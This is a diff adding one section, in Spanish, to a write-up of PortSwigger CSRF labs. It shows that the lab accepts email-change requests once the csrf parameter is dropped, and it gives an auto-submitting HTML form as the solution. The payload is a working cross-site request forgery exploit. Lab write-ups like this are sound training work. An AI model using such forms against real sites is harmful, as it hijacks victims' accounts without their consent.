@@ -413,6 +413,21 @@ Al autenticarse y hacer click en Update Email con el interceptor de burp activad
 </script>
 ```
 
+### [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
+
+Al autenticarse y hacer click en Update Email con el interceptor de burp activado, si mandamos esta request al repeater e intentamos cambiar el csrf, vemos que bloquea la petición; en cambio, si borramos el parámetro csrf, vemos que la petición es aceptada. Para resolver el laboatorio completamos lo siguiente con la url del laboratorio (en la request de burp se puede hacer click derecho y copy url).
+
+#### Solución:
+
+```html
+<form method="POST" action="https://ac131f991ed1683b801644a1003000bf.web-security-academy.net/email/change-email">
+     <input type="hidden" name="email" value="algo@mail.com">
+</form>
+<script>
+      document.forms[0].submit();
+</script>
+```
+
 ---
 
 ## [Clickjacking](https://portswigger.net/web-security/clickjacking)
